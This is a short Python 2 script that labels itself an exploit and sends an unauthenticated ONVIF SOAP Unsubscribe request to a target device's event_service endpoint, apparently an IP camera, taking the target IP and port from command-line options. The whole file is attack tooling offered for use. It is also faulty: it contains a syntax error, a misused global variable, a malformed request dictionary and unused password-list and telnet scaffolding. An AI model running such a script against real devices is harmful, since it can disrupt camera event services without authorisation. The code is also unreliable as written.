import urllib2
import urllib
import base64
import os
import getpass
import sys
import telnetlib
import time
import getopt


verbose = 0
passwordlist = 'passwordlist.txt'
LOCATION = ''
TARGET = ''
PAYLOAD = ''


def printCyberWill():
	print ""
	print ""
	print "This exploit brought to you by:"
	print ""
	print "   _____      _            __          ___ _ _ "
	print "  / ____|    | |           \ \        / (_) | |"
	print " | |    _   _| |__   ___ _ _\ \  /\  / / _| | |"
	print " | |   | | | | |_ \ / _ \ |__\ \/  \/ / | | | |"
	print " | |___| |_| | |_) |  __/ |   \  /\  /  | | | |"
	print "  \_____\__, |_.__/ \___|_|    \/  \/   |_|_|_|"
	print "         __/ |                                 "
	print "        |___/                                  "
	print ""
	print ""


class target(object):
	def __init__(self, IP, port):
		self.ip = IP
		self.port = PORT
	def securitycheck(self):
		url = 'http://' + self.ip + ':' + str(self.port) + '/onvif/event_service'	
		print url	


		values = {'<s' : 'Envelope xmlns : s="http://www.w3.org/2003/05/soap-envelope" xmlns: a="http://www.w3.org/2005/08/addressing">'
			}
		data2 = """<s:Envelope
        xmlns:s="http://www.w3.org/2003/05/soap-envelope"
        xmlns:a="http://www.w3.org/2005/08/addressing">
        <s:Header>
            <a:Action
                s:mustUnderstand="1">
                http://docs.oasis-open.org/wsn/bw-2/SubscriptionManager/UnsubscribeRequest
                </a:Action>
            <a:MessageID>
                urn:uuid:7331d2a5-2ed0-4eee-9f4f-f30163d93834
                </a:MessageID>
            <a:ReplyTo>
                <a:Address>
                    http://www.w3.org/2005/08/addressing/anonymous
                    </a:Address>
                </a:ReplyTo>
            <a:To
                s:mustUnderstand="1">
                http://10.50.176.145:8083/onvif/event_service
                </a:To>
            <SubscriptionId
                a:IsReferenceParameter="true">
                2-://10.50.176.145:8083/onvif/event_service
                </SubscriptionId>
            </s:Header>
        <s:Body
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema">
            <Unsubscribe
                xmlns="http://docs.oasis-open.org/wsn/b-2"/>
            </s:Body>
        </s:Envelope>"""

		data = urllib.urlencode(values)
		req = urllib2.Request(url, data2)
		req.add_header("Content-Type",'application/soap+xml; charset=utf-8\r\n')
		
		try:		
			response = urllib2.urlopen(req)
		except urllib2.HTTPError, e: 
			response = e
		except urllib2.URLError, e: 
			print e.reason
			sys.exit(2)
		#except httplib.HTTPException, e:
		    #checksLogger.error('HTTPException')
		except Exception:
		    import traceback
		    print 'generic exception: ' + traceback.format_exc())
	
		#except: 
		#	print "exiting"
		#	sys.exit(2)

		if response.code == 200:
			print response.read()
			
		else:
			print response
			sys.exit (2) 
				




def main(IP, PORT): 
	printCyberWill()

	ctarget = target(IP, PORT)
	
	ctarget.securitycheck()	
	
	


if __name__ == '__main__':
	IP = ''	
	exploit = ''
	try: 
		options, remainder = getopt.getopt(sys.argv[1:], 'i:vp:')
		print 'OPTIONS:', options
	except getopt.GetoptError as err:
		print 'ERROR:' + str(err)
		print 'usage -i <IP ADDRESS> -p <PORT>'
		sys.exit(2)
	for opt, arg in options:
	    if opt in ('-i'):
		IP = arg
	    elif opt in ('-v'):
		verbose = verbose + 1
	    elif opt in ('-p'):
		PORT = int(arg)


	if IP == '':
		print 'NO IP ADDRESS'
		print 'usage -i <IP ADDRESS> -p <PORT>'
		sys.exit(2)

	if PORT == '':
		print 'NO PORT'
		print 'usage -i <IP ADDRESS> -p <PORT>'
		sys.exit(2)

	main(IP, PORT)

